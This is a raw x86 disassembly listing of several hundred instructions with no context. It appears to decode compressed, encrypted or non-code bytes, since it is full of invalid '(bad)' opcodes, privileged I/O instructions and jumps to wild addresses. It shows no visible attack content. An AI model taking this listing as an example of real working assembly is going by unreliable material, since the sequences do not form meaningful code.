  41afb9:	mov    cl,0xaf
  41afbb:	dec    esp
  41afbc:	jmp    0x41af75
  41afbe:	lds    eax,FWORD PTR [edi]
  41afc0:	repnz mov bh,0x2
  41afc3:	clc    
  41afc4:	imul   ecx,DWORD PTR [eax+0x4e],0x26f97d74
  41afcb:	push   ebx
  41afcc:	jb     0x41afc1
  41afce:	gs add cl,ch
  41afd1:	jbe    0x41b04e
  41afd3:	pop    ebp
  41afd4:	std    
  41afd5:	(bad)  
  41afd6:	aas    
  41afd7:	adc    dh,bl
  41afd9:	cli    
  41afda:	mov    edi,ebp
  41afdc:	pop    ax
  41afde:	sub    bl,BYTE PTR [ebx+0x59]
  41afe1:	pusha  
  41afe2:	or     DWORD PTR [edi+0x57],0xe6480000
  41afec:	mov    ah,BYTE PTR [esi+0x378275]
  41aff2:	push   ebp
  41aff3:	push   0xe6092042
  41aff8:	xchg   DWORD PTR [ebp+0x24],ecx
  41affb:	out    0xb2,al
  41affd:	inc    edi
  41affe:	sbb    BYTE PTR [edx-0x3fd80723],al
  41b004:	test   DWORD PTR [ebp+0x74],eax
  41b007:	imul   eax,DWORD PTR [edx+0x24],0xffffffcc
  41b00b:	cmp    BYTE PTR [ebx],0x57
  41b00e:	xchg   edi,eax
  41b00f:	stos   DWORD PTR es:[edi],eax
  41b010:	dec    esp
  41b011:	setns  BYTE PTR [edx]
  41b014:	adc    eax,DWORD PTR [eax]
  41b016:	or     al,0x6a
  41b018:	push   edx
  41b019:	and    dh,dh
  41b01b:	add    bl,bh
  41b01d:	jne    0x41afdf
  41b01f:	aad    0x71
  41b021:	sbb    BYTE PTR [edx-0x3cef8e29],ch
  41b027:	imul   ecx,DWORD PTR [edi+edi*8],0x39
  41b02b:	out    0xe4,al
  41b02d:	adc    al,0xa4
  41b02f:	aad    0xfb
  41b031:	test   DWORD PTR [esi+eiz*8],ebx
  41b034:	adc    DWORD PTR [esi+ebp*2],0x818afffe
  41b03b:	or     ah,ch
  41b03d:	inc    esp
  41b03e:	retf   
  41b03f:	add    BYTE PTR [eax],al
  41b041:	cmovp  edi,DWORD PTR [esi]
  41b044:	std    
  41b045:	push   cs
  41b046:	dec    edx
  41b047:	es add al,cl
  41b04a:	in     al,dx
  41b04b:	call   0x427157
  41b050:	add    BYTE PTR [eax],al
  41b052:	add    BYTE PTR [edi+0x683f7cd8],bl
  41b058:	push   0xffffffec
  41b05a:	jmp    0x3d8905
  41b05f:	pop    ss
  41b060:	cmp    al,0x24
  41b062:	inc    edi
  41b063:	pushf  
  41b064:	dec    esi
  41b065:	push   0x0
  41b067:	shr    DWORD PTR [esp+ebx*1-0x75],cl
  41b06b:	stos   DWORD PTR es:[edi],eax
  41b06c:	(bad)  
  41b06d:	jno    0x41b087
  41b06f:	jne    0x41b0d1
  41b071:	mov    eax,0x10cf5255
  41b076:	std    
  41b077:	shr    ch,0xeb
  41b07a:	jb     0x41b0e9
  41b07c:	push   ecx
  41b07d:	mov    bh,0xf4
  41b07f:	cmp    ch,BYTE PTR ds:0x5e82bf86
  41b085:	mov    bh,0x1e
  41b087:	jne    0x41b062
  41b089:	sti    
  41b08a:	mov    ch,0xba
  41b08c:	(bad)  
  41b08e:	mov    ch,0xaa
  41b090:	xlat   BYTE PTR ds:[ebx]
  41b091:	rcr    edi,0x7d
  41b094:	loopne 0x41b057
  41b096:	add    BYTE PTR ds:0x89542c5a,cl
  41b09c:	cmc    
  41b09d:	(bad)  
  41b09f:	clc    
  41b0a0:	in     al,dx
  41b0a1:	call   0xfc5eaeea
  41b0a6:	mov    ch,0x3d
  41b0a8:	(bad)  
  41b0aa:	mov    ch,0x45
  41b0ac:	xlat   BYTE PTR ds:[ebx]
  41b0ad:	ret    
  41b0ae:	fisubr WORD PTR [ebp-0x20]
  41b0b1:	mov    edx,0x2c59b400
  41b0b6:	push   esp
  41b0b7:	add    BYTE PTR [eax],al
  41b0b9:	add    BYTE PTR [eax],al
  41b0bb:	add    BYTE PTR [ecx-0x33],al
  41b0be:	jl     0x41b10a
  41b0c0:	cdq    
  41b0c1:	sbb    dl,BYTE PTR [ebx+0x6a]
  41b0c4:	jne    0x41b072
  41b0c6:	outs   dx,BYTE PTR ds:[esi]
  41b0c7:	sbb    al,0x0
  41b0c9:	or     al,BYTE PTR ds:0x7d0120fd
  41b0cf:	enter  0x844b,0x6e
  41b0d3:	adc    BYTE PTR [edx+0x8fcf806],bl
  41b0d9:	loope  0x41b0b3
  41b0db:	outs   dx,BYTE PTR ds:[esi]
  41b0dc:	cmp    BYTE PTR [eax+ebp*8-0x7e],0xb5
  41b0e1:	aam    0x7f
  41b0e3:	outs   dx,BYTE PTR ds:[esi]
  41b0e4:	push   esp
  41b0e5:	fld    DWORD PTR [eax]
  41b0e7:	out    0x16,eax
  41b0e9:	ins    BYTE PTR es:[edi],dx
  41b0ea:	jmp    0xf64463eb
  41b0ef:	mov    cl,0xb9
  41b0f1:	add    esi,ebp
  41b0f3:	mov    cl,0xa9
  41b0f5:	add    BYTE PTR [eax],ch
  41b0f7:	in     al,0x7a
  41b0f9:	mul    DWORD PTR [edi]
  41b0fb:	pop    es
  41b0fc:	dec    ebp
  41b0fd:	add    BYTE PTR ds:0x4fd6c950,0x86
  41b104:	aas    
  41b105:	jecxz  0x41b13c
  41b107:	sti    
  41b108:	call   0xe13c993f
  41b10d:	cmp    ch,cl
  41b10f:	les    eax,FWORD PTR [ebx-0x6]
  41b112:	icebp  
  41b113:	mov    ebx,0xc4c1baed
  41b118:	xchg   edx,eax
  41b119:	sub    cl,BYTE PTR [eax+0x790eb77c]
  41b11f:	adc    eax,DWORD PTR [eax]
  41b121:	add    BYTE PTR [eax],al
  41b123:	add    BYTE PTR [eax],al
  41b125:	in     al,dx
  41b126:	xor    al,0xdb
  41b128:	jle    0x41b0d5
  41b12a:	(bad)  
  41b12b:	popa   
  41b12c:	std    
  41b12d:	sti    
  41b12e:	dec    esp
  41b12f:	idiv   DWORD PTR [edi+edi*1+0x6]
  41b133:	sar    bh,cl
  41b135:	cmc    
  41b136:	pop    esp
  41b137:	xlat   BYTE PTR ds:[ebx]
  41b138:	add    ebp,edi
  41b13a:	stc    
  41b13b:	data16 in al,dx
  41b13d:	sub    dh,bl
  41b13f:	bound  edi,QWORD PTR [ebx-0x7c18fd93]
  41b145:	retf   
  41b146:	dec    eax
  41b147:	out    dx,al
  41b148:	jg     0x41b143
  41b14a:	push   es
  41b14b:	out    0x3,eax
  41b14d:	cmc    
  41b14e:	call   0xac38ac63
  41b153:	add    DWORD PTR [esi*2+0x684e9f82],eax
  41b15a:	jle    0x41b19f
  41b15c:	push   cs
  41b15d:	jne    0x41b161
  41b15f:	addr16 in al,dx
  41b161:	das    
  41b162:	repz push 0xffffff9f
  41b165:	pop    ebp
  41b166:	add    ah,bh
  41b168:	add    DWORD PTR [ebx+0x71fd0042],0x62
  41b16f:	test   DWORD PTR [ebx],0xe998856e
  41b175:	jbe    0x41b179
  41b177:	or     eax,0xd039e97
  41b17c:	lahf   
  41b17d:	mov    dh,0x6
  41b17f:	mov    edi,0xc80b4e48
  41b184:	je     0x41b1f8
  41b186:	or     DWORD PTR [edi+0xac],eax
  41b18c:	add    BYTE PTR [eax],al
  41b18e:	dec    edx
  41b18f:	mov    DWORD PTR [ebp+0x2766d],ecx
  41b195:	repnz (bad) 
  41b197:	idiv   BYTE PTR [ebx-0x10]
  41b19a:	aaa    
  41b19b:	dec    eax
  41b19c:	cmp    al,ch
  41b19e:	jbe    0x41b1a2
  41b1a0:	add    BYTE PTR [edx],al
  41b1a2:	ins    BYTE PTR es:[edi],dx
  41b1a3:	mov    eax,DWORD PTR [ebp-0x23]
  41b1a6:	mov    ecx,ebx
  41b1a8:	mov    BYTE PTR [edi-0xaacd49a],bl
  41b1ae:	js     0x41b1a5
  41b1b0:	(bad)  
  41b1b1:	pusha  
  41b1b2:	or     BYTE PTR [edx-0x751d6878],0xc0
  41b1b9:	adc    dh,BYTE PTR [edi]
  41b1bb:	push   0xffffff87
  41b1bd:	and    eax,0x2489055b
  41b1c2:	lds    ecx,FWORD PTR [ebx+eax*1+0x10459fe0]
  41b1c9:	inc    esi
  41b1ca:	ja     0x41b14f
  41b1cc:	mov    edi,0x10443feb
  41b1d1:	bound  eax,QWORD PTR [edi]
  41b1d3:	jbe    0x41b1d4
  41b1d5:	call   0x1e133750
  41b1da:	dec    esi
  41b1db:	sbb    DWORD PTR [edx-0x1b],ecx
  41b1de:	or     edx,DWORD PTR [esi]
  41b1e0:	mov    DWORD PTR [ebx+0x5f870e10],edx
  41b1e6:	in     eax,0xe1
  41b1e8:	cld    
  41b1e9:	add    BYTE PTR [esi+ebx*2-0x1932efbc],cl
  41b1f0:	dec    BYTE PTR [edi+0x0]
  41b1f3:	add    BYTE PTR [eax],al
  41b1f5:	add    BYTE PTR [eax],al
  41b1f7:	jmp    0x41b24c
  41b1f9:	or     al,0xff
  41b1fb:	(bad)  
  41b1fc:	fsincos 
  41b1fe:	adc    eax,0x3ff498
  41b203:	out    0x43,eax
  41b205:	adc    al,0x8b
  41b207:	sub    ebx,ebp
  41b209:	test   DWORD PTR [ebp+0x4c],eax
  41b20c:	pop    esi
  41b20d:	inc    edx
  41b20e:	call   0x894a74e2
  41b213:	adc    DWORD PTR ds:0xeb7287e5,ecx
  41b219:	sti    
  41b21a:	mov    edx,ecx
  41b21c:	adc    BYTE PTR [eax+0x4a5de13f],al
  41b222:	call   0xf59cbcc
  41b227:	mov    al,ds:0x7bfffc3c
  41b22c:	das    
  41b22d:	pop    ecx
  41b22e:	lock or esp,DWORD PTR [ecx+0x62]
  41b232:	cld    
  41b233:	sti    
  41b234:	jmp    0xe3eeab5
  41b239:	rol    BYTE PTR [ebx-0x3f801384],0xce
  41b240:	test   BYTE PTR [ebx],bh
  41b242:	push   edi
  41b243:	and    BYTE PTR gs:[eax],ah
  41b246:	punpcklwd mm7,mm6
  41b249:	adc    BYTE PTR [eax],al
  41b24b:	fcomp  QWORD PTR [ebp+0x42]
  41b24e:	and    al,0x8c
  41b250:	ss push 0x0
  41b253:	sti    
  41b254:	outs   dx,DWORD PTR ds:[esi]
  41b255:	sbb    al,0x8d
  41b257:	xchg   ebx,eax
  41b258:	pop    es
  41b259:	dec    ebp
  41b25a:	push   esi
  41b25b:	add    BYTE PTR [eax],al
  41b25d:	add    BYTE PTR [eax],al
  41b25f:	add    bl,bl
  41b261:	outs   dx,DWORD PTR ds:[esi]
  41b262:	adc    BYTE PTR [ebx+0xc71e9e7],cl
  41b268:	sti    
  41b269:	outs   dx,DWORD PTR ds:[esi]
  41b26a:	or     al,ch
  41b26c:	jne    0x41b1ee
  41b26e:	in     eax,dx
  41b26f:	cld    
  41b270:	mov    ah,BYTE PTR [ebp-0x3f]
  41b273:	or     al,0xf8
  41b275:	pop    edi
  41b276:	or     BYTE PTR [eax],al
  41b278:	jne    0x41b23c
  41b27a:	cmp    eax,0x7f6e8220
  41b27f:	sbb    DWORD PTR [ebp-0x17],esi
  41b282:	jnp    0x41b2fe
  41b284:	mov    DWORD PTR [edx],esi
  41b286:	and    edx,DWORD PTR [ebx]
  41b288:	jne    0x41b273
  41b28a:	cmp    DWORD PTR [ebp-0x6f],0xffffffe9
  41b28e:	ins    BYTE PTR es:[edi],dx
  41b28f:	pop    es
  41b290:	mov    gs,WORD PTR [edi-0x5506f2a8]
  41b296:	or     BYTE PTR [eax],al
  41b298:	jne    0x41b2b1
  41b29a:	sbb    BYTE PTR ds:[edi-0x63],dh
  41b29e:	pop    edx
  41b29f:	mov    DWORD PTR [ebx-0x5628d43f],edi
  41b2a5:	(bad)  
  41b2a6:	sub    ebx,DWORD PTR [esi-0x77]
  41b2a9:	lock jl 0x41b2d4
  41b2ac:	ins    DWORD PTR es:[edi],dx
  41b2ad:	jmp    0xd1f53bb2
  41b2b2:	jge    0x41b273
  41b2b4:	mov    ecx,ecx
  41b2b6:	sub    edx,edi
  41b2b8:	push   0x67
  41b2ba:	add    eax,0x5ae97518
  41b2bf:	add    BYTE PTR [ecx+edi*2+0x75],al
  41b2c3:	push   ebp
  41b2c4:	add    BYTE PTR [eax],al
  41b2c6:	add    BYTE PTR [eax],al
  41b2c8:	add    BYTE PTR [ecx-0x25183eac],al
  41b2ce:	add    eax,DWORD PTR cs:[eax]
  41b2d1:	clc    
  41b2d2:	test   eax,0xd17383f4
  41b2d7:	add    BYTE PTR [eax],al
  41b2d9:	into   
  41b2da:	idiv   BYTE PTR [eax+0x45]
  41b2dd:	pop    ecx
  41b2de:	in     al,dx
  41b2df:	mov    eax,0x7ee8cc38
  41b2e4:	hlt    
  41b2e5:	sub    cl,0x0
  41b2e8:	mov    DWORD PTR [esi-0x13442dfe],ebp
  41b2ee:	icebp  
  41b2ef:	loopne 0x41b33e
  41b2f1:	popa   
  41b2f2:	(bad)  
  41b2f4:	fsub   QWORD PTR [ecx+0x2]
  41b2f7:	out    0x82,eax
  41b2f9:	mov    al,BYTE PTR [ecx]
  41b2fb:	sti    
  41b2fc:	imul   esp
  41b2fe:	inc    ecx
  41b2ff:	call   0xe66f6e2d
  41b304:	add    BYTE PTR [ecx-0x9],0xe6
  41b308:	add    edi,DWORD PTR [eax+0x59f184e9]
  41b30e:	fbld   TBYTE PTR [ecx]
  41b310:	inc    esi
  41b311:	fucomp st(3)
  41b313:	inc    ebp
  41b314:	jnp    0x41b306
  41b316:	mov    esi,esp
  41b318:	add    esi,DWORD PTR [ebp+0x3]
  41b31b:	lods   eax,DWORD PTR ds:[esi]
  41b31c:	pop    ebx
  41b31d:	jl     0x41b2d9
  41b31f:	push   ecx
  41b320:	loop   0x41b31d
  41b322:	cmp    al,0xdf
  41b324:	ficom  DWORD PTR ds:0x770ba3d8
  41b32a:	push   esi
  41b32b:	lods   al,BYTE PTR ds:[esi]
  41b32c:	jp     0x41b32e
  41b32e:	add    BYTE PTR [eax],al
  41b330:	add    BYTE PTR [eax],al
  41b332:	test   al,0x6e
  41b334:	loop   0x41b302
  41b336:	test   DWORD PTR [edx],ebx
  41b338:	bound  edi,QWORD PTR [esi]
  41b33a:	ins    DWORD PTR es:[edi],dx
  41b33b:	test   DWORD PTR [esi],esp
  41b33d:	jo     0x41b3af
  41b33f:	ins    BYTE PTR es:[edi],dx
  41b340:	out    0x53,eax
  41b342:	out    dx,al
  41b343:	aaa    
  41b344:	fstp   TBYTE PTR [edx-0x4b]
  41b347:	jmp    0xdf2bec22
  41b34c:	add    DWORD PTR [ebp-0x13],edi
  41b34f:	inc    edi
  41b350:	add    ebx,DWORD PTR [ebx]
  41b352:	lods   eax,DWORD PTR ds:[esi]
  41b353:	sbb    al,al
  41b355:	idiv   cl
  41b357:	mov    edi,ebp
  41b359:	add    esi,DWORD PTR [ebp-0x74]
  41b35c:	loope  0x41b387
  41b35e:	xor    ebp,DWORD PTR [esi]
  41b360:	test   BYTE PTR [eax+0x3e6f739],0xf4
  41b367:	fcos   
  41b369:	out    0x1a,eax
  41b36b:	mov    eax,ds:0xe9782a89
  41b370:	xchg   edx,eax
  41b371:	push   0x10
  41b373:	inc    edx
  41b374:	add    BYTE PTR [edx+0x297d81e4],dl
  41b37a:	jno    0x41b389
  41b37c:	add    DWORD PTR [edx+esi*2],0x2
  41b380:	add    BYTE PTR [edx+0x10],ch
  41b383:	xor    al,BYTE PTR [eax]
  41b385:	hlt    
  41b386:	(bad)  [ebx-0x4a61fab3]
  41b38c:	jae    0x41b3f6
  41b38e:	fild   WORD PTR [edi+0x18]
  41b391:	ins    BYTE PTR es:[edi],dx
  41b392:	ss push edx
  41b394:	sbb    eax,0x22
  41b399:	add    BYTE PTR [eax],al
  41b39b:	inc    eax
  41b39c:	jno    0x442f42
  41b3a2:	ret    
  41b3a3:	jbe    0x41b3d7
  41b3a5:	mov    ebx,DWORD PTR [edi+0x51c08b72]
  41b3ab:	out    0x49,eax
  41b3ad:	(bad)  
  41b3ae:	call   0x654e51a8
  41b3b3:	push   edx
  41b3b4:	idiv   edi
  41b3b6:	call   0xa7cad8fa
  41b3bb:	jp     0x41b3e8
  41b3bd:	enter  0x39d2,0xf
  41b3c1:	test   esp,eax
  41b3c3:	jae    0x41b3c7
  41b3c5:	add    BYTE PTR [ebx-0x1],dh
  41b3c8:	sbb    ecx,DWORD PTR [esi-0x33]
  41b3cb:	jmp    0x41b34d
  41b3cd:	sbb    esi,ebx
  41b3cf:	jbe    0x41b3d3
  41b3d1:	xor    ecx,0x730c5676
  41b3d7:	xor    al,0xdd
  41b3d9:	ss daa 
  41b3db:	push   0xf
  41b3dd:	and    eax,0x79
  41b3e0:	add    al,BYTE PTR [eax]
  41b3e2:	bound  eax,QWORD PTR [ebx-0x75ffd692]
  41b3e8:	or     ah,ch
  41b3ea:	cmp    esi,ebx
  41b3ec:	out    0xfb,eax
  41b3ee:	cmp    eax,DWORD PTR [edx-0x167df4c6]
  41b3f4:	or     al,0x0
  41b3f6:	add    BYTE PTR ds:0xf3fffb0a,al
  41b3fc:	pop    ebx
  41b3fd:	dec    ebx
  41b3fe:	ins    BYTE PTR es:[edi],dx
  41b3ff:	add    BYTE PTR [eax],al
  41b401:	add    BYTE PTR [eax],al
  41b403:	add    BYTE PTR [edi-0x5d7bf438],ah
  41b409:	out    0xfb,al
  41b40b:	inc    DWORD PTR [edi]
  41b40d:	sbb    al,0x18
  41b40f:	test   DWORD PTR [edx+edx*2],ebx
  41b412:	and    DWORD PTR [ebx],edi
  41b414:	add    eax,0x4c6a0d53
  41b419:	xor    DWORD PTR [ecx-0x3fa48faa],ecx
  41b41f:	call   0x3ec93c
  41b424:	fld    st(6)
  41b426:	jno    0x41b455
  41b428:	pop    edi
  41b429:	mov    BYTE PTR [edi-0x74a7bfb3],0x9c
  41b430:	sbb    al,0x1
  41b432:	add    cl,ch
  41b434:	rol    DWORD PTR [esi],cl
  41b436:	add    BYTE PTR [eax],al
  41b438:	xchg   edi,eax
  41b439:	sbb    al,0x1c
  41b43b:	sub    esp,DWORD PTR [ebx+ebp*1-0x2b]
  41b43f:	ja     0x41b4bc
  41b441:	pop    eax
  41b442:	or     BYTE PTR [edx],bh
  41b444:	shl    ah,cl
  41b446:	jo     0x41b428
  41b448:	(bad)  
  41b449:	out    dx,al
  41b44a:	std    
  41b44b:	jae    0x41b451
  41b44d:	pop    ebx
  41b44e:	inc    eax
  41b44f:	add    DWORD PTR [esi-0x708ad6e2],esi
  41b455:	pop    ebx
  41b456:	inc    ebx
  41b457:	ins    BYTE PTR es:[edi],dx
  41b458:	mov    bh,0x1e
  41b45a:	sbb    al,0x3b
  41b45c:	mov    ah,0x6b
  41b45e:	vpminsw xmm4,xmm2,xmm6
  41b462:	sti    
  41b463:	push   DWORD PTR [ebp-0x10]
  41b466:	inc    ebp
  41b467:	push   0x0
  41b46c:	add    BYTE PTR [eax-0x19],cl
  41b46f:	das    
  41b470:	(bad)  
  41b471:	into   
  41b472:	out    0x27,al
  41b474:	pop    esi
  41b475:	sub    eax,0x368afe14
  41b47a:	xchg   esp,eax
  41b47b:	jns    0x41b4c2
  41b47d:	sbb    eax,0x9a40aabc
  41b482:	dec    edi
  41b483:	xor    esi,DWORD PTR [edx+eax*4]
  41b486:	xor    eax,0x81b407f5
  41b48b:	cld    
  41b48c:	adc    BYTE PTR [ecx+ebp*8-0x26f6a1d9],0x2
  41b494:	mov    DWORD PTR [ebx-0x1e408223],edi
  41b49a:	mov    eax,0xd36d5b27
  41b49f:	repnz xor BYTE PTR [edi-0x58],al
  41b4a3:	jns    0x41b4fa
  41b4a5:	mov    cl,0x20
  41b4a7:	ret    0xfa0c
  41b4aa:	js     0x41b4ac
  41b4ac:	add    BYTE PTR [ebp-0x8],dh
  41b4af:	ret    
  41b4b0:	call   0xec891a
  41b4b5:	(bad)  
  41b4b6:	jae    0x41b4e4
  41b4b8:	or     eax,0xbefeede3
  41b4bd:	or     eax,0x74df7fe6
  41b4c2:	dec    edi
  41b4c3:	or     al,0x45
  41b4c5:	cmc    
  41b4c6:	pop    ds
  41b4c7:	(bad)  
  41b4c8:	jb     0x41b546
  41b4ca:	mov    eax,0xbd3438ce
  41b4cf:	mov    ecx,es
  41b4d1:	add    BYTE PTR [eax],al
  41b4d3:	add    BYTE PTR [eax],al
  41b4d5:	add    BYTE PTR [esi],cl
  41b4d7:	in     eax,dx
  41b4d8:	das    
  41b4d9:	shr    BYTE PTR [esi-0x486d0bd6],cl
  41b4df:	pusha  
  41b4e0:	mov    edi,0x7cbcb582
  41b4e5:	(bad)  
  41b4e7:	add    ah,dh
  41b4e9:	jecxz  0x41b4c6
  41b4eb:	inc    ebp
  41b4ec:	fsubrp st(3),st
  41b4ee:	leave  
  41b4ef:	xchg   DWORD PTR [esp+edi*8],ebp
  41b4f2:	in     eax,dx
  41b4f3:	dec    esp
  41b4f4:	cmp    ecx,DWORD PTR [ecx+0x1ee256fa]
  41b4fa:	retf   0xfb4f
  41b4fd:	ins    DWORD PTR es:[edi],dx
  41b4fe:	jne    0x41b532
  41b500:	cmp    al,BYTE PTR fs:[ecx+0xceca987]
  41b507:	inc    edi
  41b508:	call   0xee04ab10
  41b50d:	mov    BYTE PTR [ebx+ebx*8-0x6b],dl
  41b511:	jecxz  0x41b4a0
  41b513:	and    eax,0x27594a62
  41b518:	scas   eax,DWORD PTR es:[edi]
  41b519:	pop    ds
  41b51a:	dec    edx
  41b51b:	push   ebx
  41b51c:	fisttp DWORD PTR [ebp+0x3025187d]
  41b522:	out    0xf5,al
  41b524:	imul   ebx,esp,0xb6b0c5b
  41b52a:	push   eax
  41b52b:	fistp  DWORD PTR [ebp-0x72]
  41b52e:	mov    ch,0x1
  41b530:	adc    DWORD PTR [edx-0x72],ecx
  41b533:	or     esp,DWORD PTR [ebx-0x21]
  41b536:	cmp    bl,bl
  41b538:	inc    ebp
  41b539:	pop    DWORD PTR [eax]
  41b53b:	add    BYTE PTR [eax],al
  41b53d:	add    BYTE PTR [eax],al
  41b53f:	xor    eax,0x994a023f
  41b544:	or     ebp,DWORD PTR [ecx-0x1b]
  41b547:	pop    ds
  41b548:	fld    TBYTE PTR ds:0x6c5eb08f
  41b54e:	les    eax,FWORD PTR [ecx+0x9e20286]
  41b554:	fcmovnbe st,st(1)
  41b556:	inc    eax
  41b557:	ins    DWORD PTR es:[edi],dx
  41b558:	or     esp,DWORD PTR [ebp-0x41]
  41b55b:	clc    
  41b55c:	fiadd  DWORD PTR ds:0x7040ba17
  41b562:	push   edx
  41b563:	dec    ecx
  41b564:	pop    ss
  41b565:	add    BYTE PTR [eax],ch
  41b567:	xchg   BYTE PTR [edx+ecx*8+0x69ddd7ef],cl
  41b56e:	fisttp QWORD PTR [esi-0x28203b1d]
  41b574:	fnstsw WORD PTR [eax]
  41b576:	aaa    
  41b577:	inc    ebp
  41b578:	push   ecx
  41b579:	iret   
  41b57a:	(bad)  
  41b57c:	add    DWORD PTR [ecx-0x9be72c9],ecx
  41b582:	in     eax,0x7e
  41b584:	push   es
  41b585:	out    0xcc,eax
  41b587:	xchg   esp,eax
  41b588:	(bad)  
  41b58a:	repnz xor al,0x6e
  41b58d:	jno    0x41b5f4
  41b58f:	addr16 xchg esp,eax
  41b591:	add    BYTE PTR [edx+0x24],dh
  41b594:	push   ss
  41b595:	inc    ecx
  41b596:	lahf   
  41b597:	jp     0x41b5a3
  41b599:	add    al,0xde
  41b59b:	bnd js 0x41b59b
  41b59e:	xchg   BYTE PTR [edi-0x1f],dl
  41b5a1:	test   BYTE PTR [eax+eax*1+0x0],bh
  41b5a5:	add    BYTE PTR [eax],al
  41b5a7:	add    BYTE PTR [edi-0x29],dl
  41b5aa:	cmp    BYTE PTR [edi],dl
  41b5ac:	in     eax,0x53
  41b5ae:	lahf   
  41b5af:	fdivp  st(4),st
  41b5b1:	add    cl,BYTE PTR [ecx-0x9bc9549]
  41b5b7:	in     eax,0x7e
  41b5b9:	(bad)  
  41b5bb:	pushf  
  41b5bc:	push   esp
  41b5bd:	xlat   BYTE PTR ds:[ebx]
  41b5be:	cld    
  41b5bf:	adc    dh,BYTE PTR [edi-0x788a8e9a]
  41b5c5:	nop
  41b5c6:	add    BYTE PTR [edx-0x3c],dh
  41b5c9:	push   cs
  41b5ca:	inc    ecx
  41b5cb:	aas    
  41b5cc:	jp     0x41b5d8
  41b5ce:	inc    DWORD PTR [ecx+0x44]
  41b5d1:	sbb    ebx,DWORD PTR [esi-0x6b]
  41b5d4:	xor    DWORD PTR [di+0x1e],0x17
  41b5d9:	xlat   BYTE PTR ds:[ebx]
  41b5da:	or     al,0x5f
  41b5dc:	jnp    0x41b569
  41b5de:	dec    ebp
  41b5df:	aad    0xb3
  41b5e1:	rol    BYTE PTR [ebx],1
  41b5e3:	add    ah,ah
  41b5e5:	aad    0xe5
  41b5e7:	mov    ch,dl
  41b5e9:	jecxz  0x41b5e6
  41b5eb:	cmp    ecx,DWORD PTR [edx]
  41b5ed:	push   0xb
  41b5ef:	sub    ecx,0xffffffe4
  41b5f2:	sti    
  41b5f3:	dec    ebx
  41b5f5:	jnp    0x41b5f6
  41b5f7:	mov    bl,BYTE PTR [edx-0x2f09c106]
  41b5fd:	or     eax,0x874beb10
  41b602:	dec    edx
  41b603:	ins    BYTE PTR es:[edi],dx
  41b604:	ja     0x41b5a3
  41b606:	or     eax,DWORD PTR [ebx-0x41caf]
  41b60c:	add    BYTE PTR [eax],al
  41b60e:	add    BYTE PTR [eax],al
  41b610:	add    BYTE PTR [ebx+0xf42ff7b],bl
  41b616:	mov    dh,0x6
  41b618:	mov    ebp,cr3
  41b61b:	stc    
  41b61c:	(bad)  
  41b61d:	jmp    0x41b612
  41b61f:	test   DWORD PTR [ecx],esp
  41b621:	jmp    0x75f2:0xe483fbe3
  41b628:	and    bl,bh
  41b62a:	mov    dh,0x9
  41b62c:	je     0x41b667
  41b62e:	clc    
  41b62f:	add    BYTE PTR [eax],0x4c
  41b632:	add    eax,0x2a091674
  41b637:	and    BYTE PTR [eax],al
  41b639:	pop    esp
  41b63a:	repnz test DWORD PTR ds:0x3dfbe3aa,eax
  41b641:	jne    0x41b661
  41b643:	add    BYTE PTR [eax],al
  41b645:	sbb    ecx,DWORD PTR [edx-0x1c44020a]
  41b64b:	das    
  41b64c:	shl    BYTE PTR [ebp+0x4c],0x60
  41b650:	setno  BYTE PTR [ebp-0x12b40007]
  41b657:	fdivr  st,st(4)
  41b659:	pop    ebx
  41b65a:	jecxz  0x41b693
  41b65c:	fstp   DWORD PTR [ebx]
  41b65e:	jle    0x41b630
  41b660:	cld    
  41b661:	jne    0x41b653
  41b663:	fidivr WORD PTR [edi+0x3e]
  41b666:	in     eax,0xf
  41b668:	cmp    DWORD PTR [esi+0x36fcdefe],0xfffffff2
  41b66f:	(bad)  
  41b670:	sti    
  41b671:	loop   0x41b642
  41b673:	sbb    ebx,DWORD PTR [esi+0x0]
  41b676:	add    BYTE PTR [eax],al
  41b678:	add    BYTE PTR [eax],al
  41b67a:	dec    ecx
  41b67b:	mov    eax,0xdfd3d883
  41b680:	fisttp WORD PTR [ebx+eax*1]
  41b683:	in     al,dx
  41b684:	cdq    
  41b685:	or     eax,0x4100eb5d
  41b68a:	jle    0x41b636
  41b68c:	push   edi
  41b68d:	sub    eax,DWORD PTR [edx-0x55056799]
  41b693:	xchg   edi,eax
  41b694:	xor    edi,0x6c
  41b697:	loopne 0x41b61d
  41b699:	lods   eax,DWORD PTR ds:[esi]
  41b69a:	cwde   
  41b69b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b69c:	fild   WORD PTR [eax-0x7bf03573]
  41b6a2:	shl    BYTE PTR [ebp-0x21],1
  41b6a5:	cld    
  41b6a6:	inc    eax
  41b6a7:	dec    ebx
  41b6a8:	add    DWORD PTR [eax],eax
  41b6aa:	jne    0x41b664
  41b6ac:	test   BYTE PTR [ecx+0x3adf8170],bl
  41b6b2:	cmc    
  41b6b3:	scas   eax,DWORD PTR es:[edi]
  41b6b4:	add    BYTE PTR [eax],al
  41b6b6:	dec    esp
  41b6b7:	pop    edx
  41b6b8:	(bad)  
  41b6ba:	pop    edx
  41b6bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b6bc:	add    BYTE PTR [eax],ah
  41b6be:	jne    0x41b6a9
  41b6c0:	jb     0xfd21ec88
  41b6c6:	and    bl,0x20
  41b6c9:	add    BYTE PTR [ebp-0x48],dh
  41b6cc:	xchg   BYTE PTR [ecx+0x30],bh
  41b6cf:	inc    ecx
  41b6d0:	loopne 0x41b70c
  41b6d2:	pop    edx
  41b6d3:	or     DWORD PTR [eax+eax*1],eax
  41b6d6:	jb     0x41b73d
  41b6d8:	jo     0x41b6d5
  41b6da:	sbb    ch,BYTE PTR [ecx]
  41b6dc:	push   ds
  41b6dd:	pop    ebp
  41b6de:	add    BYTE PTR [eax],al
  41b6e0:	add    BYTE PTR [eax],al
  41b6e2:	add    BYTE PTR [ebp+0x2],dl
  41b6e5:	out    0x3,eax
  41b6e7:	js     0x41b767
  41b6e9:	sbb    dh,0x1
  41b6ec:	fcom   st(3)
  41b6ee:	add    eax,DWORD PTR [ebp+0x2]
  41b6f1:	out    0xea,eax
  41b6f3:	sub    al,0xd9
  41b6f5:	add    eax,0x8b38ade0
  41b6fa:	adc    ah,dh
  41b6fc:	fs cmc 
  41b6fe:	(bad)  
  41b700:	pop    es
  41b701:	xor    eax,0xff090a04
  41b706:	add    esi,DWORD PTR [ebp+0x43]
  41b709:	and    al,ch
  41b70b:	dec    ecx
  41b70c:	and    eax,0xd68a87e6
  41b711:	int    0xdf
  41b713:	cmc    
  41b714:	(bad)  
  41b716:	push   cs
  41b717:	icebp  
  41b718:	pop    ds
  41b719:	mov    ebx,0xae83a1df
